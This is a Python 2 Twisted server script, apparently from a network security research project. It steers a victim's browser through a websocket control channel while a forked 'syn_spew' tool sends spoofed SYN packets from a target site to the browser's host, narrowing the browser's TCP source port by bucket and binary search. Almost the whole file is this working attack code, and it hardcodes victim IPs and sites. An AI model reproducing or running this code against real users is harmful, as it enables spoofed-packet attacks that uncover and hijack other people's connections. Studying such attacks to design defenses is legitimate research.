#!/usr/bin/python

# Modified from https://github.com/gtaylor/txWS-example-project/blob/master/src/protocols/websockets.py

from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.python import log

import sys
import os
import signal
import subprocess
import time
import random

class WebSocketServerFactory(Factory):
    """
    This is used by twisted.internet.TCPServer to create TCP Servers for each
    port the server listens on.
    """
    def __init__(self, service):
        """
        :attr WebSocketService service: Reference to the top-level service.
        :attr EchoUpper protocol: The protocol this factor spawns.
        """
        self.service = service
        self.protocol = ControlWebSocket
        print "setup websocketserverfactory"

    def buildProtocol(self, addr):
        #return super(WebSocketServerFactory, self).buildProtocol(addr)
        p = self.protocol(addr)
        p.factory = self
        return p


NUM_BUCKETS = 100
LOW_PORT = 32768
HIGH_PORT = 61000
#LOW_PORT = 37500
#HIGH_PORT = 38500

PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
TEST_VICTIM_IP = '12.168.1.113'
#VICTIM_SITE = '66.220.149.11'  # can't use non-umich because merit egress filters
#VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
#VICTIM_SITE = '141.212.113.142' # sorry, cse.umich.edu

VICTIM_SITE = '68.40.51.184' # hobocomp.com! (only usable when victim browser is on umich campus due to merit egress filters)
VICTIM_SITE_IMG = 'http://%d-x-%d.hobocomp.com/'

#VICTIM_SITE = '23.21.237.114'   # factorable.net
#VICTIM_SITE_IMG = 'http://%d-x-%d.f.hobocomp.com/'

NEW_CONNECTION_PERIOD = 2.0
CONNECTION_TIMEOUT = 30.0
SPEW_DELAY_US = '140'
SPEW_TIME_MS  = '1000'   # if you don't win the race in the first few seconds, you're not going to

class ControlWebSocket(Protocol):
    """
    The control_sock in page.html - here we issue new commands to the browser,
    such as "make a new websocket to site.com", while we spoof SYN packets from site.com
    to guess the source port the client picked.
    """
    def __init__(self, addr):
        self.addr = addr
        self.calls = 0
        self.spewer_pid = None
        self.max_port = 0
        print 'control web from %s' % addr

    def spawnSpewer(self, low_port, high_port):
        if self.spewer_pid != None:
            print 'Error: spewer already (still?) running!'
            reactor.stop()

        try:
            self.spewer_pid = os.fork()
            if self.spewer_pid > 0:
                # parent
                return
        except OSError, e:
            print 'Error: %s' % e.strerror
        #self.addr.host = TEST_VICTIM_IP
        #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
        #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
        os.execvp('./syn_spew', ['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
                                '-t', SPEW_TIME_MS, '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
        #sys.exit(0)


    def getBucketPortRange(self):
        high = LOW_PORT + (self.bucket + 1) * PORT_BUCKET_SIZE - 1
        if self.bucket == (NUM_BUCKETS - 1):
            high = HIGH_PORT
        low = LOW_PORT + self.bucket * PORT_BUCKET_SIZE
        return (low, high)


    def adjustBucket(self, success):
        """
        Given the current bucket (self.min_port - self.mid_port), was the browser's source port in there?
        If it was, we'll look in the lower half of that range next, 
        otherwise, it was in self.mid_port - self.max_port
        """

        self.calls += 1
        if (self.calls > 25):
            print 'yikes, 25 calls...quitting'
            reactor.stop()
            return

        if self.min_port == self.mid_port:
            if success:
                port = self.min_port
            else:
                port = self.max_port
            print 'Success!!! we did it! port: %d' % port
            self.transport.write("show <b>Used port %d</b>" % port) 
            reactor.stop()
            return

        if success:
            # Look left
            self.min_port = self.min_port
            self.max_port = self.mid_port
            self.mid_port = (self.min_port + self.mid_port) / 2
        else:
            self.min_port = self.mid_port
            self.mid_port = (self.mid_port + self.max_port) / 2
            self.max_port = self.max_port

            # chrome weirdness, when you lose, it skips a port
            # (something to do with Linux source port hints?)
            self.min_port += 1
            self.mid_port += 1
            self.max_port += 1
        

        # since the browser's source port will increment by one each guess,
        # we'll increment here too.
        self.min_port += 1
        self.mid_port += 1
        self.max_port += 1

        if self.max_port > HIGH_PORT:
            self.max_port = HIGH_PORT
        if self.mid_port > HIGH_PORT:
            self.mid_port = HIGH_PORT




    def cleanupOldWebsocket(self):
        #subprocess.call(['./syn_spew', '-R', '-p', '%d-%d' % (self.min_port, self.mid_port), \
        #                 '-r', '3', '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
        #print 'done'

        if self.bucket_search:
            # now we will use binary search
            self.bucket_search = False
    
            (self.min_port, self.max_port) = self.getBucketPortRange() 
            self.mid_port = (self.min_port + self.max_port) / 2
        else:
            self.adjustBucket(True)
        
        reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
 

    def websocketTimeout(self):
        """
        Haven't heard back from websocket in a while, maybe this bucket won?!
        """

        #self.websocketTimeoutCb = None  # ha, we win
        print 'websocket timeout, killing... (%d-%d)' % (self.min_port, self.mid_port)

        if self.spewer_pid != None:
            os.kill(self.spewer_pid, signal.SIGKILL)
            self.spewer_pid = None

        #self.transport.write("kill") # kill the current websocket, so that it will try to make a new one in a bit

        reactor.callLater(NEW_CONNECTION_PERIOD, self.cleanupOldWebsocket)
       

    def fireAgain(self):
        """
        start constructing and spewing syn packets to victim
        """

        if self.bucket_search:
            (self.min_port, self.mid_port) = self.getBucketPortRange()
        
        print 'firing %d-%d (%d)' % (self.min_port, self.mid_port, self.max_port)

        self.spawnSpewer(self.min_port, self.mid_port)

        testing = "testing"
        if self.bucket_search:
            testing = "(bucket) testing"
        self.transport.write("show <b>%s %d - %d...</b>" % (testing, self.min_port, self.mid_port))
        #self.transport.write("make ws://%s/" % (VICTIM_SITE)) 
        self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.

        self.fire_time = time.time()

        # no need to call websocketTimeout, since client javascript will time itself out
        #self.websocketTimeoutCb = reactor.callLater(CONNECTION_TIMEOUT, self.websocketTimeout)
        

    def dataReceived(self, data):
        #log.msg("Got %r" % (data,))
        if data == 'closed' or data == 'timeout':

            adjust_ok = True
            if data == 'closed':
                we_won = False
                print 'Lost the race'
            else:
                we_won = True
                print 'Won the race'
                if self.bucket_search:
                    # now we will use binary search
                    self.bucket_search = False
                    adjust_ok = False    # don't adjust these values:
    
                    (self.min_port, self.max_port) = self.getBucketPortRange() 
                    self.mid_port = (self.min_port + self.max_port) / 2

            if self.spewer_pid != None:
                os.kill(self.spewer_pid, signal.SIGKILL)
                self.spewer_pid = None

            if self.bucket_search == True:
                # still doing a linear search over buckets
                self.bucket += 1
                if (self.bucket == NUM_BUCKETS):
                    print 'Ah, well that is the game :('
                    reactor.stop()
                    return
            elif adjust_ok:
                self.adjustBucket(we_won)                

            if (self.fire_time != None):
                print 'diff: %f' % (time.time() - self.fire_time)
            
            #if self.websocketTimeoutCb != None:
                # We have a timeout callback outstanding we need to cancel
                #self.websocketTimeoutCb.cancel()

            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)

        elif data == 'calmed':
            # The browser has initialized itself and is ready to begin bucket search
            if (self.fire_time != None):
                print 'diff: %f' % (time.time() - self.fire_time)
            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)

    def connectionMade(self):
        self.bucket_search = True
        self.bucket = 0
        
        # Tell that browser to open a connection to get rid of the "Chrome opens 5-50 connections
        # for whatever the fuck reason when first asked, then calms the fuck down and only opens 1
        # (or 2, you never know) to it next time.
        self.fire_time = time.time()
        self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
